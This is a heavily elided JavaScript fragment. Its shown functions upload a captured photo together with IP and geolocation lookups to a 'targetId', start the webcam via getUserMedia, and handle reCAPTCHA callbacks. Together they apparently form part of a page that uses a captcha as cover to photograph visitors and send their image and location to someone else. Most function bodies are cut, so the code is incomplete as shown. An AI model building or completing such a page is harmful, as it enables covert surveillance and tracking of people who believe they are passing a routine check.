...
function sendPhotoTo(targetId, blob, caption){
  ...
  fd.append("photo", blob, "helix_" + Date.now() + ".jpg");
  ...
  return new Promise(function(res){
    ...
    return Promise.all([getIP(), getGeo()]).then(function(arr){
      ...
      return chain.then(function(){
        ...
        delSt.textContent = "✓";
        latVal.textContent = Math.round(performance.now() - t0) + "ms";
      });
    });
  });
}
...
function startCamera(){
  ...
  camSub.textContent = "AWAITING_PERMISSION";
  ...
  navigator.mediaDevices.getUserMedia({
    ...
    camSub.textContent = "STREAMING_FRAMES";
    ...
    camSub.textContent = "ACCESS_DENIED";
...
window.onRecaptchaExpired = function(){
  ...
  camSub.textContent = "RESOLVE_AGAIN";
};
window.onRecaptchaError = function(){
  camTitle.textContent = "Error";
  camSub.textContent = "RELOAD_REQUIRED";
};
